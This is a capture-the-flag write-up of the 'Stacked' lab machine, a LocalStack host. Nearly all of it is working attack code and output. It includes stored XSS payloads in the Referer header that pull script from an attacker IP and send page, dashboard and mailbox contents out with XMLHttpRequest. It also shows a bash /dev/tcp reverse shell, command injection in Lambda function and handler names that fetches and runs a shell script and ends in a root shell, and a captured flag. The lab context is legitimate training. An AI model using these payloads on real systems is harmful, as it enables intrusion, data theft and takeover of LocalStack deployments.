# Stacked

# Enumeration

````
nmap -sV -p- --min-rate 1000 -oA nmap-10.10.11.112-sV 10.10.11.112
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-21 06:40 EDT
Nmap scan report for stacked.htb (10.10.11.112)
Host is up (0.15s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.41
2376/tcp open  ssl/docker?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
````

````
# wfuzz -H "Host: FUZZ.stacked.htb" -u http://stacked.htb -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt --hw 26
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://stacked.htb/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                     
=====================================================================

000001183:   200        444 L    1779 W     30268 Ch    "portfolio" 
````

Free Download button

* http://portfolio.stacked.htb/files/docker-compose.yml
````yml
version: "3.3"

services:
  localstack:
    container_name: "${LOCALSTACK_DOCKER_NAME-localstack_main}"
    image: localstack/localstack-full:0.12.6
    network_mode: bridge
    ports:
      - "127.0.0.1:443:443"
      - "127.0.0.1:4566:4566"
      - "127.0.0.1:4571:4571"
      - "127.0.0.1:${PORT_WEB_UI-8080}:${PORT_WEB_UI-8080}"
    environment:
      - SERVICES=serverless
      - DEBUG=1
      - DATA_DIR=/var/localstack/data
      - PORT_WEB_UI=${PORT_WEB_UI- }
      - LAMBDA_EXECUTOR=${LAMBDA_EXECUTOR- }
      - LOCALSTACK_API_KEY=${LOCALSTACK_API_KEY- }
      - KINESIS_ERROR_PROBABILITY=${KINESIS_ERROR_PROBABILITY- }
      - DOCKER_HOST=unix:///var/run/docker.sock
      - HOST_TMP_FOLDER="/tmp/localstack"
    volumes:
      - "/tmp/localstack:/tmp/localstack"
      - "/var/run/docker.sock:/var/run/docker.sock"
````

## XSS on HTTP Referer

Vulnerabilities reported on https://blog.sonarsource.com/hack-the-stack-with-localstack

````js
<script>document.location="http://10.10.15.6/blah"</script>
````

````http
POST /process.php HTTP/1.1
Host: portfolio.stacked.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 77
Origin: http://portfolio.stacked.htb
Connection: close
Referer: <script>document.location="http://10.10.15.6/blah"</script>

fullname=Blah&email=blah%40bla.com&tel=012345678901&subject=blah&message=blah
````

````sh
# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.112 - - [21/Mar/2022 09:32:46] code 404, message File not found
10.10.11.112 - - [21/Mar/2022 09:32:46] "GET /blah HTTP/1.1" 404 -
````

Instead of redirecting the entire page it is possible to load the JS from attacker's server
````js
Referer: <script src="http://10.10.15.6/xss.js"></script>
````

````
10.10.11.112 - - [21/Mar/2022 09:48:06] code 404, message File not found
10.10.11.112 - - [21/Mar/2022 09:48:06] "GET /xss.js HTTP/1.1" 404 -
````

Discover document path
````js
//xss-1
var exfilreq = new XMLHttpRequest();    
//void open(DOMString method, DOMString url, optional boolean async, optional DOMString? user, optional DOMString? password);
exfilreq.open("GET", "http://10.10.14.6/" + document.location, false);    
exfilreq.send();
````

````js
Referer: <script src="http://10.10.15.6/xss-1.js"></script>
````

````
# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.112 - - [21/Mar/2022 09:56:06] "GET /xss-1.js HTTP/1.1" 200 -
10.10.11.112 - - [21/Mar/2022 09:56:45] code 404, message File not found
10.10.11.112 - - [21/Mar/2022 09:56:45] "GET /http://mail.stacked.htb/read-mail.php?id=2 HTTP/1.1" 404 -
````

Discovery dashboard.php (dump html)
````
$ nc -nlvp 8081
````

````js
//xss-2
var exfilreq = new XMLHttpRequest();    
exfilreq.open("POST", "http://10.10.15.6:8081/", false);    
exfilreq.send(document.documentElement.outerHTML); 
````

View mailbox
````
$ nc -nlvp 8081
````

````
//xss-3
var dashboardreq = new XMLHttpRequest();    
dashboardreq.onreadystatechange = function() {              
  if (dashboardreq.readyState == 4) {                       
    var exfilreq = new XMLHttpRequest();                    
    exfilreq.open("POST", "http://10.10.15.6:8081/", false);                                                      
    exfilreq.send(dashboardreq.response);                 
  }     
};    
dashboardreq.open('GET', '/dashboard.php', false);    
dashboardreq.send();  
````

Read email
````
$ nc -nlvp 8081
````

````js
//xss-4
var mail1req = new XMLHttpRequest();    
mail1req.onreadystatechange = function() {    
  if (mail1req.readyState == 4) {    
    var exfilreq = new XMLHttpRequest();    
    exfilreq.open("POST", "http://10.10.15.6:8081/", false);    
    exfilreq.send(mail1req.response);    
  }    
};    
mail1req.open('GET', '/read-mail.php?id=1', false);    
mail1req.send();
````

> Hey Adam, I have set up S3 instance on s3-testing.stacked.htb so that you can configure the IAM users, roles and permissions. I have initialized a serverless instance for you to work from but keep in mind for the time being you can only run node instances. If you need anything let me know. Thanks.

:new: s3-testing.stacked.htb

## Aws Enumeration

````
$ curl http://s3-testing.stacked.htb
{"status": "running"}
````

````
$ aws configure 
AWS Access Key ID [None]: test
AWS Secret Access Key [None]: test
Default region name [None]: us-east-1
Default output format [None]: 
````

````
$ aws lambda list-functions --endpoint-url http://s3-testing.stacked.htb
````

# User
## Creating lambda function
````
    --function-name - whatever I want to call my function
    --zip-file - the name of the package I want to upload with the code in it
    --handler - the function to call, in the format [filename].[function]
    --role - the Amazon Resource Name (ARN) of the function’s execition role
    --runtime - what interpreter will be running the code (ie python, nodejs, etc)
````

role:
````
arn:aws:iam::123456789012:role/lambda-role
````

[AWS Lambda function (example)](https://docs.aws.amazon.com/lambda/latest/dg/nodejs-handler.html)
````node
exports.handler =  async function(event, context) {
  console.log("EVENT: \n" + JSON.stringify(event, null, 2))
  return context.logStreamName
}
````

````
$ zip index.zip index.js 
  adding: index.js (deflated 14%)
````

````
$ aws lambda create-function --function-name ex --zip-file fileb://index.zip --role arn:aws:iam::123456789012:role/lambda-role --endpoint-url http://s3-testing.stacked.htb --handler index.handler --runtime nodejs12.x

{
    "FunctionName": "ex",
    "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:ex",
    "Runtime": "nodejs12.x",
    "Role": "arn:aws:iam::123456789012::role/lambda-role",
    "Handler": "index.handler",
    "CodeSize": 291,
    "Description": "",
    "Timeout": 3,
    "LastModified": "2022-03-22T11:02:03.964+0000",
    "CodeSha256": "jQSuEbbhD8NXlJtr3KluBdDVBUuV5JbSzTV8/mVlhoA=",
    "Version": "$LATEST",
    "VpcConfig": {},
    "TracingConfig": {
        "Mode": "PassThrough"
    },
    "RevisionId": "0ac16d0c-7c92-4170-9501-e8ae1ce1d499",
    "State": "Active",
    "LastUpdateStatus": "Successful",
    "PackageType": "Zip"
}
````

````
$ aws lambda invoke --function-name ex --endpoint-url http://s3-testing.stacked.htb out.json
{
    "StatusCode": 200,
    "LogResult": "",
    "ExecutedVersion": "$LATEST"
}

$ cat out.json 
"2022/03/22/[$LATEST]fd82d52adbe51e0b29829df056a8fc90"
````

## RCE on LocalStack

````js
//xss-5
var iframe = document.createElement('iframe');    
iframe.src = 'http://127.0.0.1:8080';    
iframe.onload = function() {    
  setTimeout(function() {    
    iframe.parentNode.removeChild(iframe);    
    }, 5000);    
};    
iframe.sandbox = 'allow-scripts';    
iframe.style.height = '1px';    
iframe.style.width = '1px';    
iframe.style.position = 'fixed';    
iframe.style.top = '-9px';    
iframe.style.left = '-9px';

document.body.appendChild(iframe);
````

````
Referer: <script src="http://10.10.15.6/xss-5.js"></script>
````
or 
````
Referer: <script>document.location="http://127.0.0.1:8080"</script>
````

````
$ tcpdump -i tun0 icmp
````

````
10.10.11.112 - - [22/Mar/2022 07:36:05] "GET /xss-5.js HTTP/1.1" 200 -
````

````
$ aws lambda create-function --function-name 'ex; ping -c 1 10.10.15.6' --zip-file fileb://index.zip --role arn:aws:iam::123456789012:role/lambda-role --endpoint-url http://s3-testing.stacked.htb --handler index.handler --runtime nodejs12.x
````

````
`tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
07:50:49.770734 IP stacked.htb > 10.10.15.6: ICMP echo request, id 859, seq 1, length 64
07:50:49.770760 IP 10.10.15.6 > stacked.htb: ICMP echo reply, id 859, seq 1, length 64

07:54:49.595551 IP stacked.htb > 10.10.15.6: ICMP echo request, id 923, seq 1, length 64
07:54:49.595577 IP 10.10.15.6 > stacked.htb: ICMP echo reply, id 923, seq 1, length 64
````

Shell
````
#!/bin/bash

bash -i >& /dev/tcp/10.10.15.6/1337 0>&1
````

````
Referer: <script src="http://10.10.15.6/xss-5.js"></script>
````
or 
````
Referer: <script>document.location="http://127.0.0.1:8080"</script>
````

````
$ aws lambda create-function --function-name 'ex; wget 10.10.15.6/shell.sh -O /tmp/blah.sh; bash /tmp/blah.sh' --zip-file fileb://index.zip --role arn:aws:iam::123456789012:role/lambda-role --endpoint-url http://s3-testing.stacked.htb --handler index.handler --runtime nodejs12.x
````

````
nc -nlvp 1337
listening on [any] 1337 ...
connect to [10.10.15.6] from (UNKNOWN) [10.10.11.112] 58568
bash: cannot set terminal process group (19): Not a tty
bash: no job control in this shell
bash: /root/.bashrc: Permission denied
bash-5.0$ id
id
uid=1001(localstack) gid=1001(localstack) groups=1001(localstack)
````

````
bash-5.0$  cat /home/localstack/user.txt
c877918fc5f7cb38e0631f7849c20b1b
````

# Root


````
2022/03/22 12:36:13 CMD: UID=0    PID=1107   | unzip -o -q /tmp/localstack/zipfile.974bbfea/original_lambda_archive.zip 
2022/03/22 12:37:08 CMD: UID=0    PID=1112   | docker create -i -e DOCKER_LAMBDA_USE_STDIN=1 -e LOCALSTACK_HOSTNAME=172.17.0.2 -e EDGE_PORT=4566 -e _HANDLER=index.handler -e AWS_LAMBDA_FUNCTION_TIMEOUT=3 -e AWS_LAMBDA_FUNCTION_NAME=ex -e AWS_LAMBDA_FUNCTION_VERSION=$LATEST -e AWS_LAMBDA_FUNCTION_INVOKED_ARN=arn:aws:lambda:us-east-1:000000000000:function:ex -e AWS_LAMBDA_COGNITO_IDENTITY={} -e NODE_TLS_REJECT_UNAUTHORIZED=0 --rm lambci/lambda:nodejs12.x index.handler                                                                                              
2022/03/22 12:37:08 CMD: UID=0    PID=1111   | /bin/sh -c CONTAINER_ID="$(docker create -i   -e DOCKER_LAMBDA_USE_STDIN="$DOCKER_LAMBDA_USE_STDIN" -e LOCALSTACK_HOSTNAME="$LOCALSTACK_HOSTNAME" -e EDGE_PORT="$EDGE_PORT" -e _HANDLER="$_HANDLER" -e AWS_LAMBDA_FUNCTION_TIMEOUT="$AWS_LAMBDA_FUNCTION_TIMEOUT" -e AWS_LAMBDA_FUNCTION_NAME="$AWS_LAMBDA_FUNCTION_NAME" -e AWS_LAMBDA_FUNCTION_VERSION="$AWS_LAMBDA_FUNCTION_VERSION" -e AWS_LAMBDA_FUNCTION_INVOKED_ARN="$AWS_LAMBDA_FUNCTION_INVOKED_ARN" -e AWS_LAMBDA_COGNITO_IDENTITY="$AWS_LAMBDA_COGNITO_IDENTITY" -e NODE_TLS_REJECT_UNAUTHORIZED="$NODE_TLS_REJECT_UNAUTHORIZED"   --rm "lambci/lambda:nodejs12.x" "index.handler")";docker cp "/tmp/localstack/zipfile.974bbfea/." "$CONTAINER_ID:/var/task"; docker start -ai "$CONTAINER_ID";                                                                    
2022/03/22 12:37:08 CMD: UID=0    PID=1118   | docker cp /tmp/localstack/zipfile.974bbfea/. d1fee418bbb519279d0d7301d7c033a642af9326d655d2f4384b410656a69323:/var/task
````

common line when invoking a aws lambda function
````
docker create -i --rm "lambci/lambda:nodejs12.x" "index.handler"
````

Tests for OS injection in 'index.handler' shows it is vulnerable. We can perform a privesc as the uid that runs the docker is 0.
````
$ nc -nlvp 1337
````

````
$ aws lambda create-function --function-name shell --handler 'index.handler;$(bash /tmp/blah.sh)' --zip-file fileb://index.zip --role arn:aws:iam::123456789012:role/lambda-role --endpoint-url http://s3-testing.stacked.htb --runtime nodejs12.x
````

````
$ aws lambda invoke --function-name shell --endpoint-url http://s3-testing.stacked.htb out.json
````

````
$ nc -nlvp 1337
listening on [any] 1337 ...
connect to [10.10.15.6] from (UNKNOWN) [10.10.11.112] 60000
bash: cannot set terminal process group (1156): Not a tty
bash: no job control in this shell
bash-5.0# id
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
bash-5.0# 
````


# Secrets
* FLAG_USER = c877918fc5f7cb38e0631f7849c20b1b
* FLAG_ROOT = 
